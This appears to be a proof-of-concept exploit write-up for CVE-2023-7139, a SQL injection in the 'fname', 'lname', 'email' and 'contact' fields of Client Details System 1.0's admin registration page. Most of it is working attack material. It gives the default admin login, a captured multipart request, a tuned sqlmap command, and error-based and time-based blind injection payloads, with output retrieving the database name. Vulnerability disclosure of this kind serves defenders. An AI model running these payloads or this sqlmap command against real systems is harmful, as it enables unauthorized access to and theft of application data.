# CVE-2023-7139_Client_Details_System-SQL_Injection_3
+ **Exploit Title:** CVE-2023-7139_Client_Details_System-SQL_Injection_3
+ **Date:** 2023-26-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/client-details-system-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/CLIENT_DETAILS_SYSTEM_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-2023-7139

## References: 
+ **CVE-2023-7139:** https://vuldb.com/?id.249142
+ https://www.cve.org/CVERecord?id=CVE-2023-7139

## Description:
Client Details System 1.0 allows SQL Injection via parameters 'fname', 'lname', 'email' and 'contact' in "/clientdetails/admin/regester.php". Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the Admin Panel: "http://localhost/clientdetails/admin/"
+ Fill User Id and Password with `admin`:`client123` and log in.
+ Create Users and Register New User: "http://localhost/clientdetails/admin/regester.php"
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Captured Burp request:
```
POST /clientdetails/admin/regester.php HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 812
Content-Type: multipart/form-data; boundary=3b3b38b05bde466ba84fe94108a576e4
Cookie: PHPSESSID=p5mgq2eci66sik6s94eakcjub9
Referer: http://localhost/clientdetails/admin/regester.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="lname"

test
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="fname"

test
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="email"

test@mail.com
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="contact"

test
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="password"

test
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="signup"

Sign Up
--3b3b38b05bde466ba84fe94108a576e4--

```

+ Use sqlmap to exploit. In sqlmap, use sequencely 'fname', 'lname', 'email' and 'contact' parameters to dump the database. 
```
python sqlmap.py -r r.txt -p fname --risk 3 --level 5 --threads 1 --random-agent tamper=between,randomcase --proxy="http://127.0.0.1:8080" --dbms mysql --batch --current-db
```

```
---
Parameter: MULTIPART fname ((custom) POST)
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: --3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="lname"

test
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="fname"

test'||(SELECT 0x63477861 WHERE 3950=3950 AND (SELECT 4777 FROM(SELECT COUNT(*),CONCAT(0x717a7a7071,(SELECT (ELT(4777=4777,1))),0x71767a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="email"

test@mail.com
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="contact"

test
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="password"

test
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="signup"

Sign Up
--3b3b38b05bde466ba84fe94108a576e4--

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: --3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="lname"

test
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="fname"

test'||(SELECT 0x495a4858 WHERE 5047=5047 AND (SELECT 3063 FROM (SELECT(SLEEP(5)))fSuo))||'
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="email"

test@mail.com
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="contact"

test
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="password"

test
--3b3b38b05bde466ba84fe94108a576e4
Content-Disposition: form-data; name="signup"

Sign Up
--3b3b38b05bde466ba84fe94108a576e4--
---
[17:19:33] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.1.6, Apache 2.4.53
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[17:19:34] [INFO] fetching current database
[17:19:34] [INFO] retrieved: 'loginsystem'
current database: 'loginsystem'
```

+ current database: `loginsystem`
![3](https://github.com/h4md153v63n/CVEs/assets/5091265/ae5ce05b-ed9f-4e6b-a137-4b19fdf07850)
